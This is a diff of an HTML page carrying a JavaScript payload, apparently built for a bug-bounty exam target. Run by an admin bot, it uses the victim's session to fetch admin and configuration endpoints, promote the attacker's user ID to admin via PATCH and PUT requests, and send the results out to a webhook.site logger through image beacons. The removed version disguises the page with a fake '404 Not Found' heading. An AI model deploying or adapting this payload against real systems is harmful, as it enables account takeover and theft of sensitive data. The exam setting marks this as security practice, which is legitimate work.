@@ -1,67 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Maintenance</title></head>
 <body>
     <script>
         const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
         const api = "https://api-bugbounty-exam.hashacademy.co/api";
         const myUserId = "69da4749adf0dbb976ce8e37"; 
 
-        // Helper to send data to your webhook via Image tags
-        function exfiltrate(label, data) {
-            const payload = btoa(JSON.stringify(data));
-            new Image().src = `${logger}/?type=${label}&d=${payload}`;
-        }
-
-        async function startPivoting() {
-            // 1. DUMP SENSITIVE ADMIN ENDPOINTS
-            // We are looking for the 'second' vulnerability the instructor mentioned
-            const adminPaths = [
-                "/auth/profile",
-                "/admin/settings",
-                "/admin/config",
-                "/admin/stats",
-                "/admin/users",
-                "/system/env"
-            ];
-
-            for (let path of adminPaths) {
-                try {
-                    const res = await fetch(api + path, { credentials: "include" });
-                    if (res.ok) {
-                        const json = await res.json();
-                        exfiltrate(`LEAK_${path.replace(/\//g, '_')}`, json);
-                    }
-                } catch (e) {}
-            }
-
-            // 2. PRIVILEGE ESCALATION ATTEMPT
-            // Try to force the Admin bot to promote YOUR user account to admin
+        async function attemptElevation() {
             try {
-                await fetch(`${api}/users/${myUserId}`, {
+                // Method 1: Target the specific user update endpoint
+                // We're forcing the Admin to change your role to 'admin'
+                const res = await fetch(`${api}/users/${myUserId}`, {
                     method: "PATCH",
                     headers: { "Content-Type": "application/json" },
                     credentials: "include",
                     body: JSON.stringify({ 
                         "role": "admin",
-                        "permissions": ["all"],
-                        "isAdmin": true
+                        "isAdmin": true,
+                        "permissions": ["all"]
                     })
                 });
-                exfiltrate("ATTEMPT", "Role elevation request sent for user " + myUserId);
-            } catch (e) {}
+                
+                const data = await res.json();
+                new Image().src = `${logger}/?elevation_result=${btoa(JSON.stringify(data))}`;
 
-            // 3. DATABASE DUMP (IDOR/SQLi check)
-            // Attempting to fetch the very first booking, which often holds system flags
-            try {
-                const bookingRes = await fetch(`${api}/bookings/BK-00001`, { credentials: "include" });
-                const bookingData = await bookingRes.json();
-                exfiltrate("FIRST_BOOKING_LEAK", bookingData);
-            } catch (e) {}
+                // Method 2: Target the profile endpoint (some systems allow self-promotion if the admin does it)
+                await fetch(`${api}/auth/profile/${myUserId}`, {
+                    method: "PUT",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "include",
+                    body: JSON.stringify({ "role": "admin" })
+                });
+
+            } catch (e) {
+                new Image().src = `${logger}/?error=${btoa(e.message)}`;
+            }
         }
 
-        startPivoting();
+        attemptElevation();
     </script>
-    <h1>404 Not Found</h1>
 </body>
 </html>
